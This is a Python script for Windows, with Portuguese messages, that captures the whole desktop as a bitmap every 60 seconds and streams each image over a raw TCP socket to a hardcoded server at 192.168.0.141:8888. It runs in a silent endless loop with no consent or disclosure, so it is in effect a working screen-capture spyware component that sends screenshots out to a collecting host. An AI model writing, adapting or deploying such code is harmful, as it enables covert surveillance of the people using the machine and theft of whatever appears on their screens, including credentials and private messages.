import socket
import time
import win32api
import win32con
import win32gui
import win32ui
import os
from datetime import datetime

SERVER_IP = '192.168.0.141'
SERVER_PORT = 8888
INTERVAL_SECONDS = 60  

def get_dimensions():
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    return (width, height, left, top)

def screenshot(name='screenshot'):
    filepath = os.path.join(os.getcwd(), f"{name}.bmp")

    hdesktop = win32gui.GetDesktopWindow()
    width, height, left, top = get_dimensions()

    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()

    bmp = win32ui.CreateBitmap()
    bmp.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(bmp)
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)

    bmp.SaveBitmapFile(mem_dc, filepath)

    mem_dc.DeleteDC()
    img_dc.DeleteDC()
    win32gui.ReleaseDC(hdesktop, desktop_dc)
    win32gui.DeleteObject(bmp.GetHandle())

    print(f"[+] Screenshot salva em: {filepath}")
    return filepath

def send_image_once(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        print(f"[+] Conectado ao servidor {ip}:{port}")
    except Exception as e:
        print(f"[!] Falha ao conectar no servidor: {e}")
        return

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"screenshot_{timestamp}"
    path = screenshot(name=filename)

    with open(path, 'rb') as f:
        while True:
            chunk = f.read(4096)
            if not chunk:
                break
            sock.sendall(chunk)

    sock.close()
    print("[+] Imagem enviada com sucesso")

def main():
    while True:
        send_image_once(SERVER_IP, SERVER_PORT)
        time.sleep(INTERVAL_SECONDS)

if __name__ == '__main__':
    main()
